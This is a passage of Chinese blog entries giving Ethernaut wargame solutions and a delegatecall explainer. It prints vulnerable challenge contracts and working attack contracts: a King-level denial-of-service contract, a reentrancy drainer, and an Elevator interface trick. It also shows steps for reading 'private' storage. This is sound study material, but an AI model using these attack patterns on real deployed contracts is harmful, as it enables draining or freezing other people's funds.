alt=""></li><li>执行攻击合约的dosome函数</li><li>通关</li></ol><h1 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h1><p>这是一个Dos攻击（拒绝服务）型的漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这是一个类似于拍卖的合约<br>题目的意思其实就是说让我们在成功报价后，想办法让别人无法对你的报价再进行竞拍。因为刚好前两天才系统性的了解了拒绝服务DDOS攻击，这道题就变得很容易。</p><blockquote><p>因为这个竞拍合约需要向上一个竞拍者转账后才能完成竞拍成功（完成king的交换），那我们不让他转账成功不就可以永远不被替换了嘛，需要我们创建一个攻击合约，而此合约需要fallable和receive函数不能设置为payable，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract AttackKing &#123;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _victim) public payable &#123;</span><br><span class="line">        _victim.call.gas(1000000).value(msg.value)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>在此攻击合约中我们不写任何receive fallback函数，那么默认就是没有payable修饰的，自然也就接收不了转账。当然，也可以在receive中用revert()语句去终止交易。</p><ul><li>解题步骤</li></ul><ol><li>先用<code>web3.eth.getStorageAt(&#39;0x2814Cd87DdF364D7A5Ef9BAC507fdad131956647&#39;,1)</code>查看一下当前竞拍值是多少<br><img src="03.png" alt=""><br>在这里可以看到是0.001ether，那么我们就需要提供大于0.001ether的报价才能成为king</li><li>在创建攻击合约时，同时存0.0011个ether进去(如果你测试币多的话直接传1ether就行)<br><img src="02.jpg" alt=""></li><li>通关</li></ol></blockquote><h2 id="10-Re-Entrancy"><a href="#10-Re-Entrancy" class="headerlink" title="10 Re-Entrancy"></a>10 Re-Entrancy</h2><p>顾名思义，这是一个重入漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以注意到withdraw函数里面很明显是存在重入漏洞的，（在更改全局变量之前进行了外部调用）于是我们利用这个漏洞写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address payable target;</span><br><span class="line">    uint amount &#x3D; 1000000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _addr) public payable &#123;</span><br><span class="line">        target&#x3D;_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public payable&#123;</span><br><span class="line">        target.call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;,address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setp2() public payable &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback () external payable&#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意第一步第二步最好分开写，否则可能造成交易超过gas limit的上限导致执行失败</p><ul><li>解题步骤<br>按照step1，2执行即可<br><img src="../images/ethernaut/e10/01.png" alt=""><br>可以看到原合约已经没有token了。而我们的账户有了很多，攻击成功。<br><img src="../images/ethernaut/e10/02.png" alt=""></li></ul><h1 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h1><p>这道题其实考的是编程时的一个逻辑漏洞<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们到达顶层，也就是把<code>top</code>变为true，但是我们明显能看到想要进入<code>goTo(uint)</code>中的判断条件，<code>building.isLastFloor(_floor)</code>就必须是<code>false</code>，<code>top</code>也等于这个值，乍一看想要<code>top=true</code>好像是个不可能的事。但由于<code>Building</code>是个接口，而<code>isLastFloor</code>则是一个抽象函数，这里<code>Building(msg.sender)</code>远程调用我们传入的合约，因此我们可以自己设计这个函数的具体内容。</p><blockquote><p>其实在这里两次调用了<code>building.isLastFloor(floor)</code>，他们的返回值一定是一样的吗？既然我们可以自定义函数，我们就可以在函数里面做一些变动让判断条件在第二次调用时，返回相反的值。</p></blockquote><p>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyBuilding&#123;</span><br><span class="line">    uint temp &#x3D; 5;</span><br><span class="line">    Elevator e;</span><br><span class="line">    function isLastFloor(uint i) external returns (bool)&#123;</span><br><span class="line">        if(temp &#x3D;&#x3D; i)&#123;</span><br><span class="line">            temp &#x3D; 6;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public&#123;</span><br><span class="line">        address adr &#x3D; 0xd8b4056b73Cd9E7890a32548cEAd96D6116B52ae;&#x2F;&#x2F;Elevator地址</span><br><span class="line">        e &#x3D; Elevator(adr);</span><br><span class="line">        &#x2F;&#x2F; adr.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,5));</span><br><span class="line">        e.goTo(5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，在第一次调用之后我就把temp的值变了，那么第二次再进行判断时，就会返回true。</p><ul><li>解题步骤<br>执行dosome()即可</li></ul><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>这个题和前面08 Vault几乎一样，实质就是告诉我们以太坊中的储存，就算是private修饰，他也是可以被访问到的，比如用web3脚本<br><code>web3.eth.getStorageAt()</code>就可以轻松访问到。<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们只要获得key就可以通关，也就是合约中的<code>data</code>,<br>直接获取即可。</p><ul><li>解题步骤<ol><li>用<code>web3.eth.getStorageAt(&#39;0xe1442525366a0cC8e2D25E480B0ACf47FE291Ecc&#39;,5)</code>得到data<br><img src="04.png" alt=""></li><li>然后由于require中的判断是去前16个byte，去前32位执行unlock方法即可<br><img src="05.png" alt=""></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delegatecall</title>
      <link href="/delegatecall/"/>
      <url>/delegatecall/</url>
      
        <content type="html"><![CDATA[<h1 id="Solidity之DelegateCall"><a href="#Solidity之DelegateCall" class="headerlink" title="Solidity之DelegateCall"></a>Solidity之DelegateCall</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在Solidity中，如果只是为了代码复用，我们会把公共代码抽出来，部署到一个library中，后面就可以像调用C库、Java库一样使用了。但是library中不允许定义任何storage类型的变量，这就意味着library不能修改合约的状态。如果需要修改合约状态，我们需要部署一个新的合约，这就涉及到合约调用合约的情况。</p><h2 id="三种调用函数"><a href="#三种调用函数" class="headerlink" title="三种调用函数"></a>三种调用函数</h2><p>  在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。<br/></p><p>  他们的异同点如下：</p><ul><li><strong>call</strong>: 调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境</li><li><strong>delegatecall</strong>: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li><li><p><strong>callcode</strong>: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p><blockquote><p>注意：”callcode”已被弃用，取而代之的是” delegatcall “</p></blockquote></li><li><p><strong>CALL vs. CALLCODE</strong></p><blockquote><p>CALL和CALLCODE的区别在于：代码执行的上下文环境不同。</p></blockquote><p>具体来说，CALL修改的是被调用者的storage，而CALLCODE修改的是调用者的storage。<br><img src="Delegatecall01.png" alt=""></p></li><li><p><strong>CALLCODE vs. DELEGATECALL</strong><br>可以认为<code>DELEGATECALL</code>是<code>CALLCODE</code>的一个bugfix版本，官方已经不建议使用<code>CALLCODE</code>了。<br/></p><blockquote><p>CALLCODE和DELEGATECALL的区别在于：msg.sender不同。</p></blockquote><p>具体来说，DELEGATECALL会一直使用原始调用者的地址，而CALLCODE不会。<br><img src="Delegatecall02.png" alt=""></p></li></ul><h1 id="delegatecall的细节问题"><a href="#delegatecall的细节问题" class="headerlink" title="delegatecall的细节问题"></a>delegatecall的细节问题</h1><p>  先来看一段代码：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract calltest &#123;</span><br><span class="line">  address public c;</span><br><span class="line">  address public b;</span><br><span class="line"> </span><br><span class="line">  function test() public returns (address a)&#123;</span><br><span class="line">      a&#x3D;address(this);</span><br><span class="line">      b&#x3D;a;</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract compare &#123;</span><br><span class="line">    address public b;</span><br><span class="line">    address public c;</span><br><span class="line">    address testaddress &#x3D; address of calltest;</span><br><span class="line">    function withdelegatecall()&#123;</span><br><span class="line">        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  看起来似乎没什么问题，但是两个合约的b与c向量的位置不同，我们来看一下执行的结果.<br>  b没有被赋值，反而是c被赋值了。<br>  在这里我们要关注一个EVM层面的问题，<strong>如何保存字段变量到存储</strong></p><p>  简单来说，EVM为字段变量分配槽号（slot number），第一个被申明的占0号槽位，以此类推。</p><blockquote><p>在EVM中，它在智能合约存储中有2^256个插槽，每个插槽可以保存32字节大小的数据。 </p></blockquote><p>  <br/><br>  我们知道使用delegatecall时代码执行的上下文是当前的合约，这代表使用的存储也是当前合约，当然这里指的是storage存储，然而我们要执行的是在目标合约那里的opcode，当我们的操作涉及到了storage变量时，其对应的访存指令其实是硬编码在我们的操作指令当中的，而EVM中访问storage存储的依据就是这些变量的存储位，对于上面的合约我们执行的汇编代码为sload——即访存指令，给定的即访问一号存储位，在我们的主合约中即对应变量c，在calltest合约中则对应于变量b，所以事实上调用delegatecall来使用storage变量时其实依据并不是变量名而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的</p><p>  参考：<br>  <a href="https://blog.csdn.net/Fly_hps/article/details/81218219" target="_blank" rel="noopener">delegatecall杂谈</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 01-06</title>
      <link href="/2022-11-03-ethernaut01/"/>
      <url>/2022-11-03-ethernaut01/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-1-6"><a href="#Ethernaut靶场刷题记录-1-6" class="headerlink" title="Ethernaut靶场刷题记录(1-6)"></a>Ethernaut靶场刷题记录(1-6)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="01-FallBack"><a href="#01-FallBack" class="headerlink" title="01 FallBack"></a>01 FallBack</h2><p>这道题是比较简单的，合约的逻辑有问题导致出现漏洞<br/><br>我们先来了解一下receive和fallback的区别：</p><blockquote><p><strong>receive():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external，payable；<br><strong>fallback():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external；<br>    可设置为payable；</p></blockquote><p>当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发；<br>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发；</p><p>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到的SafeMath的地址已经获取不到了，我直接选择找了老版本的SafeMath源码在我本地拉取下来。或者也可以直接用<code>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</code>路径代替。<br/></p><p>题目想要我们获得合约的所有权，<code>owner</code>再使用<code>withdraw</code>提取出来</p><ul><li><p>解题思路<br>  阅读完源码发现此合约的<code>receive</code>函数是有明显漏洞的，我们只需要向此函数转发出一笔转账交易即可将<code>owner</code>的所有权改为自己</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  当然，为了达成<code>receive</code>中的require限制条件，我们还需要执行一次<code>contribute()</code>来将我们的<code>contributions[msg.sender] &gt; 0</code><br/><br>  在获得<code>owner</code>后，执行<code>withdraw()</code>即可通关。</p></li><li><p>解题步骤</p><ol><li>在控制台中调用<code>contract.contribute({value:1)</code>在不带单位的情况下默认单位为<code>wei</code><br><img src="01.png" alt=""></li><li>可以使用<code>contract.address</code>命令查看合约地址，然后使用metamask给合约地址转一笔账<br><img src="02_1.png" alt=""><br><img src="02_2.png" alt=""></li><li>此时<code>owner</code>应该已经到了，我们来看一下：<br><img src="03.png" alt=""></li><li>执行<code>withdraw()</code>函数进行提款<br><img src="04.png" alt=""></li><li>通关<br><img src="05.png" alt=""></li></ol></li></ul><h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a>02 Fallout</h2><p>  emmm很白痴的关卡<br>  先看代码</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">          require(</span><br><span class="line">              msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">              &quot;caller is not the owner&quot;</span><br><span class="line">          );</span><br><span class="line">          _;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  题目要求获得合约的所有权。<br>  我看了这个合约很久，一直没找到可以攻击的地方……直到我看到了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>  仔细看这个构造函数的名字，我们会发现<code>Fal1out</code>中间居然有个<code>1</code>关键是他还在上面注释了<code>constructor</code>就很坑。<br/><br>  那既然它不是个构造函数，并且具有构造函数的功能，那我们直接调用这个错误的“构造函数”就可以获得合约的所有权了。</p><blockquote><p>构造函数最好用<code>constructor() public {……}</code>的写法</p><ul><li>解题步骤<ol><li>调用<code>fal1out</code>函数<br><img src="06.png" alt=""></li><li>可以看到此时我们已经获得了合约的所有权<br><img src="07.png" alt=""></li><li>通关<br><img src="suc.png" alt=""></li></ol></li></ul></blockquote><h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>这是一个和区块结构有关的漏洞，由于用<code>blockhash(block.number.sub(1))</code>的方式计算上一区块的哈希的方式是极容易被攻击利用的。<br/><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import 